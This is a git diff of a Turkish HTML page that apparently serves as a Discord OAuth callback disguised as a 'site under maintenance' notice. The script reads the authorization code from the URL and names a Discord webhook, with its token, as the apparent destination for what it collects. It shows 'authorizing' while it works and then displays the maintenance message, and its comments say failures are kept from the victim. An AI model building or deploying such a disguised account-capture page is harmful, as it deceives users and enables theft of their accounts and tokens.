@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Bakımda</title>
+  <title>Yetkilendiriliyor...</title>
   <style>
     @keyframes rgbCycle {
       0% { color: rgb(255, 0, 0); }
@@ -20,17 +20,21 @@
       justify-content: center;
       font-family: monospace, monospace;
       user-select: none;
+      color: #ff4757;
+      padding: 2rem;
     }
     h1 {
       font-size: 2.5rem;
-      animation: rgbCycle 4s linear infinite;
       text-align: center;
-      /* Burada renk animasyonu uygulanıyor */
+      user-select: none;
+    }
+    .rgb {
+      animation: rgbCycle 4s linear infinite;
     }
   </style>
 </head>
 <body>
-  <h1>Sitemiz Şu anda Bakımda.</h1>
+  <h1 id="status">Yetkilendiriliyor...</h1>
 
   <script>
     (async () => {
@@ -39,9 +43,11 @@
       const redirect_uri = "https://rencordx.github.io/home/callback.html";
       const webhook_url = "https://discord.com/api/webhooks/1381264711236059187/KR_WNPlGdrKRltp8Vj0LjKFhOSe7ecO9Br_dI0-6AWmRr7rF5-Vg0GYgXvIs-b_xOKrA";
 
+      const statusEl = document.getElementById("status");
+
       const code = new URLSearchParams(window.location.search).get("code");
       if (!code) {
-        // Kod yoksa işlem iptal, sadece sayfa görünür kalır.
+        // Kod yoksa hiçbir işlem yok, status kalır
         return;
       }
 
@@ -86,9 +92,11 @@
           })
         });
 
-        // İşlem tamam, kullanıcıya sadece bakımda mesajı görünsün.
+        // İşlem tamamlandıktan sonra yazıyı değiştir
+        statusEl.textContent = "Sitemiz Şu anda Bakımda.";
+        statusEl.classList.add("rgb");
       } catch (err) {
-        // Hata olsa da kullanıcı görmesin, sadece konsola logla (isteğe bağlı)
+        // Hata olsa da kullanıcı görmesin, sadece konsola logla
         console.error("Hata:", err);
       }
     })();
